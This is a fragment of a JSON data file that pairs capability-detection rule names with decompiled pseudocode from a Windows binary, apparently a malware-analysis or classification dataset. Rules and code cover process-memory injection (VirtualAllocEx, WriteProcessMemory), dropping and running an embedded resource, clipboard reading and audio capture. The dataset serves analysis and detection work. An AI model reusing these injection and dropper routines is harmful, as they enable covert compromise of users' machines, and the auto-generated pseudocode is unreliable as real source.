        "decompiled_code": "\nvoid __fastcall fcn.0044d894(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 8) = *(param_2 + 8);\n    *(in_EAX + 0xc) = *(param_2 + 0xc);\n    *(in_EAX + 0x10) = *(param_2 + 0x10);\n    *(in_EAX + 0x14) = *(param_2 + 0x14);\n    *(in_EAX + 0x18) = *(param_2 + 0x18);\n    *(in_EAX + 0x1c) = *(param_2 + 0x1c);\n    *(in_EAX + 0x28) = *(param_2 + 0x28);\n    *(in_EAX + 0x2c) = *(param_2 + 0x2c);\n    *(in_EAX + 0x30) = *(param_2 + 0x30);\n    *(in_EAX + 0x34) = *(param_2 + 0x34);\n    return;\n}\n",
        "token_count": 255
    },
    "00454b04": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00454b04(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0040857c(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 156
    },
    "00466c40": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint * fcn.00466c40(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    puVar1 = fcn.00402f00();\n    fcn.004661b8();\n    uVar2 = fcn.00402f00();\n    *puVar1 = uVar2;\n    puVar1[1] = *(in_EAX + 0xc);\n    puVar1[2] = 0;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    iVar3 = sub.winmm.dll_waveInPrepareHeader(*(in_EAX + 0x94), puVar1, 0x20);\n    if (iVar3 == 0) {\n        sub.winmm.dll_waveInAddBuffer(*(in_EAX + 0x94), puVar1, 0x20);\n    }\n    return puVar1;\n}\n",
        "token_count": 215
    },
    "00403770": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00403770(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403af4();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x491034;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x4035c4;\n    uVar1 = fcn.0040580c();\n    fcn.004059dc(uVar1);\n    fcn.004030fc();\n    iVar2 = fcn.0040580c();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 200
    },
    "004052cc": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.004052cc(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x491000;\n    *0x491000 = 0;\n    puVar3 = *0x4977c8;\n    puVar4 = 0x4977c8;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 170
    },
    "0040f760": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f760(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x14), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "00427360": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00427360(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x42737b;\n        iVar1 = fcn.00404528();\n        piStack24 = 0x427380;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x42738d;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x42739f;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x4273b7;\n        piStack24 = var_4h;\n        iVar1 = fcn.00404864();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x4273f0;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00404650();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.0040484c();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 382
    },
    "0042c330": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042c330(uint param_1, uint param_2)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    var_18h = 0;\n    var_1ch = 0;\n    uStack52 = 0x42c420;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    var_14h = 0;\n    fcn.0040700c();\n    iVar1 = sub.oleaut32.dll_GetErrorInfo();\n    if (iVar1 == 0) {\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x10))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x14))();\n        fcn.00405d28();\n        (**(_pe_dos_header + 0x18))();\n        uStack96 = 0;\n        uStack100 = 0x42c3ad;\n        (**(_pe_dos_header + 0x1c))();\n    }\n    fcn.004057d4();\n    fcn.004057d4();\n    fcn.004057d4();\n    iStack104 = fcn.0042bccc(var_14h, var_1ch, var_18h, in_EAX);\n    uStack108 = var_14h;\n    if (iStack104 == 0) {\n        iStack104 = fcn.00405470();\n        uStack108 = var_14h;\n    }\n    uStack96 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x495014)(0xeedfade, 1, 7, &stack0xffffff94);\n    return;\n}\n",
        "token_count": 529
    },
    "004316e8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004316e8(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4316fc;\n    (**(*in_EAX + 0x18))();\n    uStack28 = 0x431740;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(2);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x431747);\n    return;\n}\n",
        "token_count": 215
    },
    "00431750": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431750(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x431763;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x4317a5;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData(3);\n    uVar1 = sub.user32.dll_GetClipboardData(9);\n    (**(*param_2 + 0x5c))();\n    *in_FS_OFFSET = uVar1;\n    (**(*in_EAX + 0x14))(0x4317ac);\n    return;\n}\n",
        "token_count": 216
    },
    "0045b274": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b274(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.0045a73c();\n    fcn.0045aad4();\n    return;\n}\n",
        "token_count": 433
    },
    "0044dd1c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0044dd1c(uint param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if ((in_EAX ^ in_EAX >> 0x1f) - (in_EAX >> 0x1f) < (param_2 ^ param_2 >> 0x1f) - (param_2 >> 0x1f)) {\n        return in_EAX;\n    }\n    return param_2;\n}\n",
        "token_count": 109
    },
    "00474df0": {
        "rules": [
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d",
            "write process memory"
        ],
        "decompiled_code": "\nulong fcn.00474df0(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    uVar1 = sub.kernel32.dll_VirtualAllocEx();\n    sub.kernel32.dll_WriteProcessMemory();\n    return CONCAT44(in_EAX, uVar1);\n}\n",
        "token_count": 61
    },
    "0040f750": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0040f750(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_WaitForSingleObject(*(in_EAX + 0x10), *(in_EAX + 0x18));\n    return;\n}\n",
        "token_count": 55
    },
    "0041f774": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041f774(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x4999b8);\n    if (iVar1 == 0) {\n        fcn.0041f768();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "0048e340": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0048e340(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack16 = 0x48e392;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    do {\n        fcn.004735e8();\n        fcn.00485150();\n        uStack20 = 10000;\n        sub.kernel32.dll_Sleep_2();\n    } while( true );\n}\n",
        "token_count": 145
    },
    "0041005c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041005c(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 122
    },
    "0041e9e4": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e9e4(uint param_1)\n\n{\n    fcn.0041d058(param_1);\n    fcn.00405620();\n    fcn.00405a3c();\n    fcn.0041d058();\n    return;\n}\n",
        "token_count": 62
    },
    "00420354": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00420354(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x420114);\n    (**(*param_2 + 4))(0x420120);\n    return;\n}\n",
        "token_count": 66
    },
    "00425228": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425228(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.004257f0();\n    fcn.004257f0();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 214
    },
    "00425738": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425738(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x425794 & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x499a08);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x499a0c);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x499a10);\n        *(in_EAX + 8) = ~*0x425794 & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 162
    },
    "004258bc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004258bc(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.00424d00();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x491e20));\n    return;\n}\n",
        "token_count": 108
    },
    "00425f54": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00425f54(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 170
    },
    "00438330": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00438330(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x438368 == (*0x438364 & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00448c68": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c68(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00448c90(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 88
    },
    "00448c90": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00448c90(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.00448634();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x49262c) | *((arg_ch & 0xff) * 4 + 0x49263c), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "00459930": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00459930(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x499c72);\n    sub.user32.dll_RemovePropA(*(in_EAX + 0x1b4), *0x499c70);\n    return;\n}\n",
        "token_count": 78
    },
    "0048bdd4": {
        "rules": [
            "create or open file",
            "create process on Windows",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048bdd4(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack48 = 0x48bec8;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a30(0, arg_10h, arg_ch);\n    fcn.00489bb0(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(&var_ch);\n    fcn.00405818();\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    fcn.00489bb0(0, 0, 5);\n    fcn.00405728(&var_14h);\n    fcn.00405818();\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    func_0x0040ff44(0, 0x48bedc, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x48becf);\n    return;\n}\n",
        "token_count": 509
    },
    "0048c494": {
        "rules": [
            "create or open file",
            "create thread",
            "write file on Windows",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048c494(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack56 = 0x48c5ac;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407a30(0, arg_10h, arg_ch);\n    fcn.00489bb0(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405728(0);\n    fcn.004058e0(0x48c5c8, 0);\n    uVar2 = fcn.004059dc();\n    uVar2 = func_0x00407960(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 4);\n    fcn.00489bb0();\n    fcn.00405728(0);\n    fcn.004058e0(0x48c5c8, 0);\n    uVar1 = sub.kernel32.dll_CreateThread_1(0, 0, fcn.0048c3e4, uVar1, 0, &var_ch);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405554(0x48c5b3);\n    return;\n}\n",
        "token_count": 548
    },
    "0047eaec": {
        "rules": [
            "create thread"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0047eaec(void)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar3;\n    float10 fVar4;\n    uint *puVar5;\n    uint uVar6;\n    uint *arg_8h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *0x494cbc;\n    iVar2 = 6;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    _var_10h = CONCAT44(unaff_EBX, unaff_ESI);\n    _var_18h = CONCAT44(&stack0xfffffffc, 0x47ecf0);\n    var_1ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0047eaec::var_1ch;\n    var_20h = **0x494b58;\n    var_24h = 0x47eb20;\n    fcn.0048bf2c();\n    var_24h = var_1ch;\n    var_28h = 0x47eb30;\n    fcn.004735e8();\n    var_28h = 0x47eb3b;\n    fcn.00409b7c();\n    var_28h = var_20h;\n    var_2ch = 0x47eb4d;\n    fcn.004058e0();\n    **0x494a74 = 0;\n    uVar3 = 1;\n    **0x494bac = 0;\n    var_2ch = 0x47eb6b;\n    fcn.004735e8();\n    var_2ch = 0x47eb78;\n    fcn.00405974();\n    if (uVar3) {\n        var_2ch = *0x494c2c;\n        sub.kernel32.dll_CreateThread_1(0, 0, 0x482028, 0, 0);\n        **0x4948f4 = 1;\n    }\n    **0x4948b0 = 1;\n    arg_8h = &fcn.0047eaec::var_2ch;\n    fcn.0040ef44(arg_8h, *0x47ed2c);\n    fcn.00405584();\n    (**(***0x494808 + 0x2c))();\n    fcn.0048bf54();\n    fcn.00405584();\n    fcn.00405974();\n    if (uVar3) {\n        fVar4 = fcn.0040bc98();\n        _var_10h = fVar4;\n        var_ch = _var_10h >> 0x20;\n        fcn.0040c8f8(var_10h, var_ch);\n        fVar4 = fcn.0040bcc4();\n        _var_18h = fVar4;\n        var_14h = _var_18h >> 0x20;\n        fcn.0040c8f8(var_18h, var_14h);\n        fcn.004058e0(var_8h, 0x47ed60, var_4h);\n    }\n    iVar2 = fcn.0041fa34();\n    **0x494d18 = iVar2;\n    *(**0x494d18 + 0xf) = 1;\n    fcn.0041fc40();\n    fcn.0041fef0();\n    while( true ) {\n        uVar6 = 0;\n        puVar5 = puVar1;\n        iVar2 = sub.user32.dll_GetMessageA(puVar1, 0, 0, 0);\n        if (iVar2 == 0) break;\n        sub.user32.dll_TranslateMessage(puVar1);\n        arg_8h = puVar1;\n        sub.user32.dll_DispatchMessageA();\n    }\n    *in_FS_OFFSET = puVar5;\n    fcn.00405554(0x47ecf7, uVar6, arg_8h);\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1063
    },
    "00411c48": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411c48(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x494be0)();\n            fcn.00411298();\n        }\n        else {\n            fcn.00410e58();\n        }\n    }\n    else {\n        fcn.00411d34();\n        (***0x494be0)();\n        fcn.00411298();\n    }\n    return;\n}\n",
        "token_count": 133
    },
    "00430f30": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00430f30(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x430f5a;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 127
    },
    "0044880c": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0044880c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44889e;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x492644) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.00448634();\n    if (cVar1 == '\\0') {\n        fcn.00407550();\n        fcn.0040dafc();\n        fcn.00404ec4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.00448a34();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00405530(0x4488a5);\n    return;\n}\n",
        "token_count": 337
    },
    "0044a9f0": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a9f0(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405974(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404800();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00405584();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00452ff0": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452ff0(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45308d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        fcn.00419f24();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.0044a8b4();\n        fcn.0044a9f0();\n        fcn.00450894();\n        fcn.0044a74c();\n        fcn.0044ab10();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x453094;\n    uStack28 = 0x45308c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 294
    },
    "0041fef0": {
        "rules": [
            "resume thread"
        ],
        "decompiled_code": "\nvoid fcn.0041fef0(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_ResumeThread(*(in_EAX + 4));\n    fcn.0041fc00();\n    if (iVar1 == 1) {\n        *(in_EAX + 0xe) = 0;\n    }\n    return;\n}\n",
        "token_count": 86
    },
